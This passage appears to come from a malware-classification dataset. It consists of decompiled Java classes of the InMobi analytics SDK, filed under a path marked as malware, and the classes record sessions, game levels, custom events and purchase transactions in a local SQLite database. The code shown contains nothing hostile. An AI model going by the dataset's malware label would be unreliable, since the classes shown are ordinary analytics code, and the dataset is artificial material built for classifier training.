transactionItemCount=analyticsEvent.getTransactionItemCount();         if (transactionItemCount > 0) {           contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_COUNT,Integer.valueOf(transactionItemCount));         }         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_DESCRIPTION,analyticsEvent.getTransactionItemDescription());         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_ITEM_PRICE,Double.valueOf(analyticsEvent.getTransactionItemPrice()));         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ITEM_CURRENCY_CODE,analyticsEvent.getTransactionCurrencyCode());         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_PRODUCT_ID,analyticsEvent.getTransactionProductId());         contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_ID,analyticsEvent.getTransactionId());         int transactionStatus=analyticsEvent.getTransactionStatus();         if (AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.INVALID.getValue() != transactionStatus) {           contentValues.put(AnalyticsSQLiteHelper.TRANSACTION_STATUS,Integer.valueOf(transactionStatus));         }         j2=this.b.insert(AnalyticsSQLiteHelper.TABLE_TRANSACTION,null,contentValues);       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_CUSTOM_EVENT)) {         contentValues.put(AnalyticsSQLiteHelper.CUSTOM_EVENT_EVENT_NAME,analyticsEvent.getEventCustomName());         j2=this.b.insert(AnalyticsSQLiteHelper.TABLE_CUSTOM_EVENT,null,contentValues);       }       ContentValues contentValues4=new ContentValues();       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_EVENT_ID,Long.valueOf(j2));       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,analyticsEvent.getEventType());       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_SID,analyticsEvent.getEventSessionId());       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_TS,Long.valueOf(analyticsEvent.getEventTimeStamp()));       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_SSTS,Long.valueOf(analyticsEvent.getEventSessionTimeStamp()));       contentValues4.put(AnalyticsSQLiteHelper.EVENT_LIST_AM,analyticsEvent.getEventAttributeMap());       this.b.insert(AnalyticsSQLiteHelper.TABLE_EVENT_LIST,null,contentValues4);     }  else {       Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Database full"");     }     if (!AnalyticsUtils.getStartHandle() && AnalyticsNetworkManager.getHandler() != null) {       AnalyticsUtils.setStartHandle(true);       AnalyticsNetworkManager.getHandler().sendEmptyMessageDelayed(1001,AnalyticsUtils.getTimeinterval());     }   }   public synchronized List<AnalyticsEvent> getEvents(){     List<AnalyticsEvent> arrayList;     try {       a();       arrayList=c();       b();     }  catch (    Exception e2) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Error reading events from DB."");       arrayList=new ArrayList<>();     }     return arrayList;   }   private List<AnalyticsEvent> c(){     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IMAppDatabaseManager->getEvents"");     ArrayList arrayList=new ArrayList();     if (!this.b.isOpen()) {       android.util.Log.v(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IMAppDatabaseManager->getEvents()-database is not open"");       return arrayList;     }     Cursor query=this.b.query(AnalyticsSQLiteHelper.TABLE_EVENT_LIST,d,null,null,null,null,null,AnalyticsUtils.getMaxevents());     query.moveToFirst();     while (!query.isAfterLast()) {       AnalyticsEvent a=a(query);       a.setEventTableId(query.getLong(0));       arrayList.add(a);       query.moveToNext();     }     query.close();     return arrayList;   }   private AnalyticsEvent a(  Cursor cursor){     Cursor cursor2=null;     AnalyticsEvent analyticsEvent=new AnalyticsEvent(cursor.getString(2));     analyticsEvent.setEventSessionId(cursor.getString(3));     analyticsEvent.setEventId(cursor.getLong(0));     analyticsEvent.setEventTimeStamp(cursor.getLong(4));     analyticsEvent.setEventSessionTimeStamp(cursor.getLong(5));     analyticsEvent.setEventAttributeMap(cursor.getString(6));     long j=cursor.getLong(1);     String l=Long.toString(j);     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IMAppDatabaseManager->"" + analyticsEvent.getEventType() + ""-""+ j);     if (j > -1) {       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_LEVEL_BEGIN)) {         cursor2=this.b.query(AnalyticsSQLiteHelper.TABLE_LEVEL_BEGIN,e,""_id = ?"",new String[]{l},null,null,null);         cursor2.moveToFirst();         analyticsEvent.setEventLevelId(cursor2.getString(1));         analyticsEvent.setEventLevelName(cursor2.getString(2));       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_LEVEL_END)) {         cursor2=this.b.query(AnalyticsSQLiteHelper.TABLE_LEVEL_END,f,""_id = ?"",new String[]{l},null,null,null);         cursor2.moveToFirst();         analyticsEvent.setEventLevelId(cursor2.getString(1));         analyticsEvent.setEventLevelName(cursor2.getString(2));         analyticsEvent.setEventLevelStatus(cursor2.getString(3));         analyticsEvent.setEventTimeTaken(cursor2.getString(4));         analyticsEvent.setEventAttemptCount(cursor2.getString(5));         analyticsEvent.setEventAttemptTime(cursor2.getString(6));       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_CUSTOM_EVENT)) {         cursor2=this.b.query(AnalyticsSQLiteHelper.TABLE_CUSTOM_EVENT,g,""_id = ?"",new String[]{l},null,null,null);         cursor2.moveToFirst();         analyticsEvent.setEventCustomName(cursor2.getString(1));       }  else       if (analyticsEvent.getEventType().equals(AnalyticsEvent.TYPE_TAG_TRANSACTION)) {         cursor2=this.b.query(AnalyticsSQLiteHelper.TABLE_TRANSACTION,i,""_id = ?"",new String[]{l},null,null,null);         cursor2.moveToFirst();         analyticsEvent.setTransactionItemName(cursor2.getString(1));         analyticsEvent.setTransactionItemType(cursor2.getInt(2));         analyticsEvent.setTransactionItemCount(cursor2.getInt(3));         analyticsEvent.setTransactionItemDescription(cursor2.getString(4));         analyticsEvent.setTransactionItemPrice(cursor2.getDouble(5));         analyticsEvent.setTransactionCurrencyCode(cursor2.getString(6));         analyticsEvent.setTransactionProductId(cursor2.getString(7));         analyticsEvent.setTransactionId(cursor2.getString(8));         analyticsEvent.setTransactionStatus(cursor2.getInt(9));       }       if (cursor2 != null) {         cursor2.close();       }     }     return analyticsEvent;   }   public synchronized void deleteEvents(  List<Long> list){     try {       a();       a(list);       b();     }  catch (    Exception e2) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Error deleting from DB."");     }   }   private void a(  List<Long> list){     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IMAppDatabaseManager->deleteEvents"");     Iterator<Long> it=list.iterator();     while (it.hasNext()) {       String l=it.next().toString();       Cursor query=this.b.query(AnalyticsSQLiteHelper.TABLE_EVENT_LIST,d,""_id=?"",new String[]{l},null,null,null,""1"");       query.moveToFirst();       Long valueOf=Long.valueOf(query.getLong(1));       String l2=valueOf.toString();       String string=query.getString(2);       if (valueOf.longValue() > -1) {         if (string.equals(AnalyticsEvent.TYPE_LEVEL_BEGIN)) {           this.b.delete(AnalyticsSQLiteHelper.TABLE_LEVEL_BEGIN,""_id = ?"",new String[]{l2});         }  else         if (string.equals(AnalyticsEvent.TYPE_LEVEL_END)) {           this.b.delete(AnalyticsSQLiteHelper.TABLE_LEVEL_END,""_id = ?"",new String[]{l2});         }  else         if (string.equals(AnalyticsEvent.TYPE_CUSTOM_EVENT)) {           this.b.delete(AnalyticsSQLiteHelper.TABLE_CUSTOM_EVENT,""_id = ?"",new String[]{l2});         }  else         if (string.equals(AnalyticsEvent.TYPE_TAG_TRANSACTION)) {           this.b.delete(AnalyticsSQLiteHelper.TABLE_TRANSACTION,""_id = ?"",new String[]{l2});         }       }       query.close();       this.b.delete(AnalyticsSQLiteHelper.TABLE_EVENT_LIST,""_id = ?"",new String[]{l});     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\AnalyticsEvent.code","public class AnalyticsEvent {   public static final String EVENT_ID=""id"";   public static final String IN_APP=""inapp"";   public static final String SUBS=""subs"";   public static final String TYPE_CUSTOM_EVENT=""ce"";   public static final String TYPE_END_SESSION=""es"";   public static final String TYPE_LEVEL_BEGIN=""lb"";   public static final String TYPE_LEVEL_END=""le"";   public static final String TYPE_START_SESSION=""ss"";   public static final String TYPE_TAG_TRANSACTION=""pi"";   private long a;   private String b;   private String c;   private long d;   private String e;   private String f;   private String g;   private String h;   private String i;   private String j;   private String k;   private String l;   private String m;   private String n;   private TRANSACTION_ITEM_TYPE o;   private double p;   private int q;   private String r;   private String s;   private String t;   private TRANSACTION_STATUS_SERVER_CODE u;   private long v;   private long w;   public enum TRANSACTION_ITEM_TYPE {  INVALID(-1),   INAPP(1),   SUBSCRIPTION(2);   private final int a;   TRANSACTION_ITEM_TYPE(  int i){     this.a=i;   }   public int getValue(){     return this.a;   } }   public enum TRANSACTION_STATUS_SERVER_CODE {  INVALID(-1),   PURCHASED(1),   FAILED(2),   RESTORED(3),   REFUNDED(4);   private final int a;   TRANSACTION_STATUS_SERVER_CODE(  int i){     this.a=i;   }   public int getValue(){     return this.a;   } }   public enum TRANSACTION_STATUS_GOOGLE_API_VALUES {  PURCHASED(0),   FAILED(1),   REFUNDED(2);   private final int a;   TRANSACTION_STATUS_GOOGLE_API_VALUES(  int i){     this.a=i;   }   public int getValue(){     return this.a;   } }   public AnalyticsEvent(  String str){     this.b=str;   }   public long getEventId(){     return this.a;   }   public void setEventId(  long j){     this.a=j;   }   public String getTransactionItemName(){     return this.m;   }   public void setTransactionItemName(  String str){     this.m=str;   }   public String getTransactionItemDescription(){     return this.n;   }   public void setTransactionItemDescription(  String str){     this.n=str;   }   public int getTransactionItemType(){     return this.o == null ? TRANSACTION_ITEM_TYPE.INVALID.getValue() : this.o.getValue();   }   public void setTransactionItemType(  int i){     if (TRANSACTION_ITEM_TYPE.INAPP.getValue() == i) {       this.o=TRANSACTION_ITEM_TYPE.INAPP;     }  else     if (TRANSACTION_ITEM_TYPE.SUBSCRIPTION.getValue() == i) {       this.o=TRANSACTION_ITEM_TYPE.SUBSCRIPTION;     }  else {       this.o=TRANSACTION_ITEM_TYPE.INVALID;     }   }   public double getTransactionItemPrice(){     return this.p;   }   public void setTransactionItemPrice(  double d){     this.p=d;   }   public int getTransactionItemCount(){     return this.q;   }   public void setTransactionItemCount(  int i){     this.q=i;   }   public String getTransactionCurrencyCode(){     return this.r;   }   public void setTransactionCurrencyCode(  String str){     this.r=str;   }   public String getTransactionProductId(){     return this.s;   }   public void setTransactionProductId(  String str){     this.s=str;   }   public String getTransactionId(){     return this.t;   }   public void setTransactionId(  String str){     this.t=str;   }   public int getTransactionStatus(){     return this.u == null ? TRANSACTION_STATUS_SERVER_CODE.INVALID.getValue() : this.u.getValue();   }   public void setTransactionStatus(  int i){     if (TRANSACTION_STATUS_SERVER_CODE.PURCHASED.getValue() == i) {       this.u=TRANSACTION_STATUS_SERVER_CODE.PURCHASED;       return;     }     if (TRANSACTION_STATUS_SERVER_CODE.REFUNDED.getValue() == i) {       this.u=TRANSACTION_STATUS_SERVER_CODE.REFUNDED;     }  else     if (TRANSACTION_STATUS_SERVER_CODE.FAILED.getValue() == i) {       this.u=TRANSACTION_STATUS_SERVER_CODE.FAILED;     }  else {       this.u=TRANSACTION_STATUS_SERVER_CODE.INVALID;     }   }   public String getEventSessionId(){     return this.c;   }   public void setEventSessionId(  String str){     this.c=str;   }   public String getEventType(){     return this.b;   }   public void setEventAttributeMap(  String str){     this.e=str;   }   public String getEventAttributeMap(){     return this.e;   }   public long getEventTimeStamp(){     return this.v;   }   public void setEventTimeStamp(  long j){     this.v=j;   }   public String getEventLevelId(){     return this.f;   }   public void setEventLevelId(  String str){     this.f=str;   }   public String getEventLevelName(){     return this.g;   }   public void setEventLevelName(  String str){     this.g=str;   }   public String getEventLevelStatus(){     return this.h;   }   public void setEventLevelStatus(  String str){     this.h=str;   }   public String getEventTimeTaken(){     return this.i;   }   public void setEventTimeTaken(  String str){     this.i=str;   }   public String getEventAttemptCount(){     return this.j;   }   public void setEventAttemptCount(  String str){     this.j=str;   }   public String getEventAttemptTime(){     return this.k;   }   public void setEventAttemptTime(  String str){     this.k=str;   }   public String getEventCustomName(){     return this.l;   }   public void setEventCustomName(  String str){     this.l=str;   }   public long getEventTableId(){     return this.w;   }   public void setEventTableId(  long j){     this.w=j;   }   public long getEventSessionTimeStamp(){     return this.d;   }   public void setEventSessionTimeStamp(  long j){     this.d=j;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\AnalyticsEventsQueue.code","public class AnalyticsEventsQueue extends Vector<AnalyticsFunctions> {   private static AnalyticsEventsQueue a=null;   private static final long serialVersionUID=-1291938489149189478L;   private AtomicBoolean b=new AtomicBoolean(false);   public static synchronized AnalyticsEventsQueue getInstance(){     AnalyticsEventsQueue analyticsEventsQueue; synchronized (AnalyticsEventsQueue.class) {       if (a == null) {         a=new AnalyticsEventsQueue();       }       analyticsEventsQueue=a;     }     return analyticsEventsQueue;   }   public synchronized void processFunctions(){     if (!this.b.get()) {       this.b.set(true);       new a().start();     }   } class a extends Thread {     a(){     }     @Override public void run(){       while (!AnalyticsEventsQueue.this.isEmpty()) {         try {           AnalyticsEventsQueue.this.a(AnalyticsEventsQueue.this.remove(0));         }  catch (        Exception e) {           Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception processing function"",e);           return;         }       }     }   }   @Override public synchronized boolean isEmpty(){     boolean isEmpty;     isEmpty=super.isEmpty();     if (isEmpty) {       this.b.set(false);     }     return isEmpty;   }   public void a(  AnalyticsFunctions analyticsFunctions){     analyticsFunctions.processFunction();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\AnalyticsFunctions.code","public abstract class AnalyticsFunctions {   private FunctionName a=null;   public enum FunctionName {  SS,   ES,   LB,   LE,   CE,   PI}   public abstract AnalyticsEvent processFunction();   public FunctionName getFunctionName(){     return this.a;   }   public void insertInDatabase(  AnalyticsEvent analyticsEvent){     try {       AnalyticsDatabaseManager.getInstance().insertEvents(analyticsEvent);     }  catch (    Exception e) {       Log.w(AnalyticsUtils.ANALYTICS_LOGGING_TAG,e);     }   }   public void printWarning(  String str){     Log.d(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IllegalStateException"",new IllegalStateException(str));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\AnalyticsSQLiteHelper.code","public class AnalyticsSQLiteHelper extends SQLiteOpenHelper {   public static final String ATTEMPT_DATA_BEGIN_TIME=""begintime"";   public static final String ATTEMPT_DATA_LEVEL_ID=""levelid"";   public static final String ATTEMPT_DATA_TOTAL_COUNT=""totalcount"";   public static final String ATTEMPT_DATA_TOTAL_TIME=""totaltime"";   public static final String CUSTOM_EVENT_EVENT_NAME=""eventname"";   public static final String DATABASE_NAME=""ltvp.db"";   public static final String EVENT_LIST_AM=""am"";   public static final String EVENT_LIST_EVENT_ID=""eventid"";   public static final String EVENT_LIST_SID=""sid"";   public static final String EVENT_LIST_SSTS=""ssts"";   public static final String EVENT_LIST_TS=""ts"";   public static final String EVENT_LIST_TYPE=""type"";   public static final String GENERAL_ID=""_id"";   public static final String LEVEL_BEGIN_LEVEL_ID=""levelid"";   public static final String LEVEL_BEGIN_LEVEL_NAME=""levelname"";   public static final String LEVEL_END_ATTEMPT_COUNT=""attemptcount"";   public static final String LEVEL_END_ATTEMPT_TIME=""attempttime"";   public static final String LEVEL_END_LEVEL_ID=""levelid"";   public static final String LEVEL_END_LEVEL_NAME=""levelname"";   public static final String LEVEL_END_LEVEL_STATUS=""levelstatus"";   public static final String LEVEL_END_TIME_TAKEN=""timetaken"";   public static final String OLD_DATABASE_NAME=""appengage.db"";   public static final String TABLE_ATTEMPT_DATA=""attemptdata"";   public static final String TABLE_CUSTOM_EVENT=""customevent"";   public static final String TABLE_EVENT_LIST=""eventlist"";   public static final String TABLE_LEVEL_BEGIN=""levelbegin"";   public static final String TABLE_LEVEL_END=""levelend"";   public static final String TABLE_SESSION_LIST=""sessionlist"";   public static final String TABLE_TRANSACTION=""transactiondetail"";   public static final String TRANSACTION_ID=""transactionId"";   public static final String TRANSACTION_ITEM_COUNT=""itemCount"";   public static final String TRANSACTION_ITEM_CURRENCY_CODE=""currencyCode"";   public static final String TRANSACTION_ITEM_DESCRIPTION=""itemDescription"";   public static final String TRANSACTION_ITEM_ITEM_PRICE=""itemPrice"";   public static final String TRANSACTION_ITEM_NAME=""itemName"";   public static final String TRANSACTION_ITEM_TYPE=""itemType"";   public static final String TRANSACTION_PRODUCT_ID=""productId"";   public static final String TRANSACTION_STATUS=""transactionStatus"";   public AnalyticsSQLiteHelper(  Context context){     super(context,DATABASE_NAME,(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS eventlist (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, eventid INTEGER NOT NULL, type VARCHAR NOT NULL, sid VARCHAR NOT NULL, ts VARCHAR NOT NULL, ssts VARCHAR NOT NULL, am VARCHAR)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS sessionlist (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, start INTEGER NOT NULL, end INTEGER NOT NULL)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS levelbegin (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, levelid VARCHAR, levelname VARCHAR)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS levelend (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, levelid VARCHAR, levelname VARCHAR, levelstatus VARCHAR, timetaken VARCHAR, attemptcount VARCHAR, attempttime VARCHAR)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS transactiondetail (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, itemName VARCHAR, itemType INTEGER, itemCount INTEGER, itemDescription VARCHAR, itemPrice REAL, currencyCode VARCHAR, productId VARCHAR, transactionId VARCHAR, transactionStatus INTEGER)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS customevent (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, eventname VARCHAR)"");     sQLiteDatabase.execSQL(""CREATE TABLE IF NOT EXISTS attemptdata (_id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, levelid VARCHAR, begintime VARCHAR NOT NULL, totalcount VARCHAR NOT NULL, totaltime VARCHAR NOT NULL)"");   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     Log.debug(AnalyticsSQLiteHelper.class.getName(),""Upgrading database from version "" + i + "" to ""+ i2+ "", which will destroy all old data"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS eventlist"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS sessionlist"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS levelbegin"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS levelend"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS transactiondetail"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS customevent"");     sQLiteDatabase.execSQL(""DROP TABLE IF EXISTS attemptdata"");     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionEndSession.code","public class FunctionEndSession extends AnalyticsFunctions {   private Context a;   private Map<String,String> b;   public FunctionEndSession(  Context context,  Map<String,String> map){     this.a=context;     this.b=map;   }   private AnalyticsEvent a(){     if (SessionInfo.getSessionId(this.a) == null) {       return null;     }     AnalyticsEvent analyticsEvent=new AnalyticsEvent(AnalyticsEvent.TYPE_END_SESSION);     analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.a));     analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.a));     analyticsEvent.setEventTimeStamp(System.currentTimeMillis() / 1000);     SessionInfo.removeSessionId(this.a);     if (this.b != null) {       analyticsEvent.setEventAttributeMap(AnalyticsUtils.convertToJSON(this.b));     }     insertInDatabase(analyticsEvent);     return analyticsEvent;   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionLevelBegin.code","public class FunctionLevelBegin extends AnalyticsFunctions {   private Context a;   private Map<String,String> b;   private int c;   private String d;   public FunctionLevelBegin(  Context context,  int i,  String str,  Map<String,String> map){     this.a=context;     this.b=map;     this.c=i;     this.d=str;   }   public int getLevelId(){     return this.c;   }   public String getLevelName(){     return this.d;   }   public Map<String,String> getLbMap(){     return this.b;   }   private AnalyticsEvent a(){     if (SessionInfo.getSessionId(this.a) == null) {       return null;     }     AnalyticsEvent analyticsEvent=new AnalyticsEvent(AnalyticsEvent.TYPE_LEVEL_BEGIN);     analyticsEvent.setEventLevelId(Integer.toString(this.c));     analyticsEvent.setEventLevelName(this.d);     if (this.b != null) {       analyticsEvent.setEventAttributeMap(AnalyticsUtils.convertToJSON(this.b));     }     analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.a));     analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.a));     analyticsEvent.setEventTimeStamp(System.currentTimeMillis() / 1000);     insertInDatabase(analyticsEvent);     return analyticsEvent;   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionLevelEnd.code","public class FunctionLevelEnd extends FunctionLevelBegin {   private AnalyticsEventsWrapper.IMSectionStatus a;   private Context b;   public FunctionLevelEnd(  Context context,  int i,  String str,  AnalyticsEventsWrapper.IMSectionStatus iMSectionStatus,  Map<String,String> map){     super(context,i,str,map);     this.b=context;     this.a=iMSectionStatus;   }   protected AnalyticsEventsWrapper.IMSectionStatus getLevelStatus(){     return this.a;   }   private AnalyticsEvent a(){     if (SessionInfo.getSessionId(this.b) != null) {       AnalyticsEvent analyticsEvent=new AnalyticsEvent(AnalyticsEvent.TYPE_LEVEL_END);       analyticsEvent.setEventLevelId(Integer.toString(getLevelId()));       analyticsEvent.setEventLevelName(getLevelName());       if (getLbMap() != null) {         analyticsEvent.setEventAttributeMap(AnalyticsUtils.convertToJSON(getLbMap()));       }       analyticsEvent.setEventLevelStatus(""1"");       analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.b));       analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.b));       analyticsEvent.setEventTimeStamp(System.currentTimeMillis() / 1000);       insertInDatabase(analyticsEvent);       return analyticsEvent;     }     printWarning(""Please call startSession before calling levelEnd"");     return null;   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionStartSession.code","public class FunctionStartSession extends AnalyticsFunctions {   private Context a;   private String b;   private Map<String,String> c;   public FunctionStartSession(  Context context,  String str,  Map<String,String> map){     this.a=context;     this.b=str;     this.c=map;   }   private AnalyticsEvent a(){     if (SessionInfo.getSessionId(this.a) != null) {       return null;     }     SessionInfo.storeAppId(this.a,this.b);     SessionInfo.storeSessionId(this.a);     SessionInfo.storeFirstTime(this.a);     AnalyticsEvent analyticsEvent=new AnalyticsEvent(AnalyticsEvent.TYPE_START_SESSION);     if (this.c != null) {       analyticsEvent.setEventAttributeMap(AnalyticsUtils.convertToJSON(this.c));     }     analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.a));     analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.a));     analyticsEvent.setEventTimeStamp(SessionInfo.getSessionTime(this.a));     insertInDatabase(analyticsEvent);     return analyticsEvent;   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionTagEvent.code","public class FunctionTagEvent extends AnalyticsFunctions {   private Context a;   private String b;   private Map<String,String> c;   public FunctionTagEvent(  Context context,  String str,  Map<String,String> map){     this.a=context;     this.b=str;     this.c=map;   }   private AnalyticsEvent a(){     if (SessionInfo.getSessionId(this.a) != null) {       AnalyticsEvent analyticsEvent=new AnalyticsEvent(AnalyticsEvent.TYPE_CUSTOM_EVENT);       analyticsEvent.setEventCustomName(this.b);       if (this.c != null) {         analyticsEvent.setEventAttributeMap(AnalyticsUtils.convertToJSON(this.c));       }       analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.a));       analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.a));       analyticsEvent.setEventTimeStamp(System.currentTimeMillis() / 1000);       insertInDatabase(analyticsEvent);       return analyticsEvent;     }     printWarning(""Please call startSession before calling trackEvent"");     return null;   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.db\FunctionTagTransaction.code","public class FunctionTagTransaction extends AnalyticsFunctions {   private Context a;   private Intent b;   private Bundle c;   public FunctionTagTransaction(  Context context,  Intent intent,  Bundle bundle){     this.a=context;     this.b=intent;     this.c=bundle;   }   private AnalyticsEvent a(){     int value;     AnalyticsEvent analyticsEvent;     Exception e;     AnalyticsEvent analyticsEvent2;     try {       if (SessionInfo.getSessionId(this.a) != null && this.b != null) {         AnalyticsEvent analyticsEvent3=new AnalyticsEvent(AnalyticsEvent.TYPE_TAG_TRANSACTION);         int intExtra=this.b.getIntExtra(""RESPONSE_CODE"",0);         String stringExtra=this.b.getStringExtra(""INAPP_PURCHASE_DATA"");         if (intExtra == 0) {           try {             JSONObject jSONObject=new JSONObject(stringExtra);             analyticsEvent3.setTransactionId(jSONObject.getString(""orderId""));             analyticsEvent3.setTransactionProductId(jSONObject.getString(AnalyticsSQLiteHelper.TRANSACTION_PRODUCT_ID));             long j=jSONObject.getLong(""purchaseTime"");             if (0 == j) {               j=System.currentTimeMillis();             }             analyticsEvent3.setEventTimeStamp(j / 1000);             int i=jSONObject.getInt(""purchaseState"");             if (AnalyticsEvent.TRANSACTION_STATUS_GOOGLE_API_VALUES.PURCHASED.getValue() == i) {               value=AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.PURCHASED.getValue();             }  else             if (AnalyticsEvent.TRANSACTION_STATUS_GOOGLE_API_VALUES.FAILED.getValue() == i) {               value=AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.FAILED.getValue();             }  else             if (AnalyticsEvent.TRANSACTION_STATUS_GOOGLE_API_VALUES.REFUNDED.getValue() == i) {               value=AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.REFUNDED.getValue();             }  else {               value=AnalyticsEvent.TRANSACTION_STATUS_SERVER_CODE.RESTORED.getValue();             }             analyticsEvent3.setTransactionStatus(value);             try {               analyticsEvent=a(analyticsEvent3);             }  catch (            Exception e2) {               analyticsEvent=analyticsEvent3;               e=e2;             }             try {               analyticsEvent.setEventSessionId(SessionInfo.getSessionId(this.a));               analyticsEvent.setEventSessionTimeStamp(SessionInfo.getSessionTime(this.a));               analyticsEvent2=analyticsEvent;             }  catch (            Exception e3) {               e=e3;               Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Error sending transaction info. Bundle details invalid"");               Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Failed to send extra params transaction"",e);               analyticsEvent2=analyticsEvent;               insertInDatabase(analyticsEvent2);               return analyticsEvent2;             }             insertInDatabase(analyticsEvent2);             return analyticsEvent2;           }  catch (          JSONException e4) {             Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Error sending transaction info. Transaction details invalid"");             Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Failed transaction"",e4);             return null;           }         }         return analyticsEvent3;       }     }  catch (    Exception e5) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception in tag transaction"",e5);     }     return null;   }   private com.inmobi.commons.analytics.db.AnalyticsEvent a(  com.inmobi.commons.analytics.db.AnalyticsEvent r11){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.commons.analytics.db.FunctionTagTransaction.a(com.inmobi.commons.analytics.db.AnalyticsEvent):com.inmobi.commons.analytics.db.AnalyticsEvent"");   }   @Override public AnalyticsEvent processFunction(){     return a();   } } "
